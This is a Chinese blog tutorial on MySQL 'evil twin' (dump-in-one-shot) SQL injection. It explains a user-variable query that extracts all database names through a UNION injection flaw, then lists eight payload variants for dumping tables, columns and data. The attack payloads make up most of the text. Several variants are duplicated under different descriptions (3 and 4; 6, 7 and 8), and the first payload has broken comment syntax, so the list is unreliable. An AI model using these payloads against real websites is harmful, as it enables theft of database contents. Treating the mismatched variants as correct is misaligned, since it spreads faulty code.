
---

title: SQL Evil Twin Injection

urlname: uh0b87

date: 2019-10-22 11:30:50 +0800

tags: [Security,SQL Injection]

---
SQL evil twin injection是一种可以从数据库中快速获取全部数据的注入方法。它的注入语句使用了SQL用户自定义变量（User Defined Variable），因此语法上不大容易理解。这篇教程将详细介绍常用的SQL evil twin injection语句，以及该语句的含义。

先从一个最常用的注入语句开始，利用evil twin injection来获取所有的数据库（database）信息。
```sql
(select (@a) from (select(@a:=0x00),(select  (@a) from (information_schema.schemata)where (@a)in (@a:=/ !50000concat/(@a,schema_name,'<br>
'))))a)
```

为了方便理解，将以上语句稍做格式化，如下：
```sql
(select (@a) 
 from (select (@a:=0x00),(select (@a) 
                          from (information_schema.schemata)
	                        where (@a)in (@a:=/ !50000concat/(@a,schema_name,'<br>'))
                         )
      ) a)
```

这是一个嵌套的SQL语句：内层的子查询构造了一个名为a的临时表，然后外层的查询语句从临时表a中查询出[用户自定义变量](https://www.geeksforgeeks.org/mysql-user-defind-variables/)@a。首先解读下内层子查询语句：

1. 这是一条不包含from子句的select语句，查询的结果生成一个两列的临时表a。第一列的值是@a:=0x00。第二列的值是一条select语句的结果@a。
1. @a是一个用户自定义变量。在执行(@a:=0x00)时，它被赋值为0x00。为什么这里必须要赋值？因为如果不赋值的话，新定义的用户自定义变量的默认值是NULL。这样在执行后面那条查询语句的where子句中的concat函数时，由于第一个参数是NULL，因此会导致concat返回NULL，而无法获取到schema_name。
1. 在执行完(@a:=0x00)这条赋值语句后，SQL引擎将执行
```sql
(select  (@a) 
 from (information_schema.schemata) 
 where (@a) in (@a:=/!50000concat/(@a,schema_name,'<br>')))
```

4. 按照[SQL语句的执行顺序](https://www.periscopedata.com/blog/sql-query-order-of-operations)，首先SQL引擎将找到information_schema.schemata表，然后执行where子句中的in子句。当MySQL版本大于5.0.0时，/!50000concat/将变成concat。也就是说in子句会将所有的schema_name连接成一个字符串，不同的schema_name使用'<br>'作为分隔符。所生成的结果字符串再赋值给用户自定义变量@a。第三行中的where子句永远为真，因此这条子查询的目的是获取所有的schema_name，并赋值给用户自定义变量@a。
4. 最终的临时表a包含两列，第一列是@a:=0x00，第二列是concat语句的结果，包含所有的shema_name。
4. 再来看最后的一个select语句，也就是第一行的select语句。由于临时表a并没有列名，因此select (@a)将获取到@a最新的值，也就是所有的shema_name。

当要注入的数据库存在UNION注入漏洞时，可以利用以上的查询语句获取所有的数据库名。将以上语句稍做修改，可以产生更多的变种：

1. 获取所有的表名

```sql
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where (@a)in (@a:=/*!50000concat*/(@a,table_name,'<br>'))))a)
```

2. 获取information_schema之外的所有表名

```sql
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.tables)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_schema,0x3a,table_name,'<br>'))))a)
```

3. 获取所有的数据库和表名

```sql
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
```

4. 获取所有的数据库、表名和列名

```sql
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and(@a)in (@a:=/*!50000concat*/(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
```

5. 获取包含特定字符串的表名

```sql
(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns)where table_schema!='information_schema' and table_name like 'Hacker_%' and(@a)in (@a:=concat(@a,table_schema,' > ',table_name,' > ',column_name,'<br>'))))a)
```

6. 获取每个表和所有的列名

```sql
(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,' :: ',@tbl:=table_name,'',column_name), (column_name))))))a)
```

7. 获取每个表、行数和所有列名

```sql
(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,' :: ',@tbl:=table_name,'',column_name), (column_name))))))a)
```

8. 从一个表中获取列数据

```sql
(select (@a) from (select(@a:=0x00),(@tbl:=0x00),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,' :: ',@tbl:=table_name,'',column_name), (column_name))))))a)
```

参考资料：

1. [http://www.securityidiots.com/Web-Pentest/SQL-Injection/sql-evil-twin-injection.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/sql-evil-twin-injection.html)
1. [http://www.creatigon.com/blog/dios-query-collections/](http://www.creatigon.com/blog/dios-query-collections/)

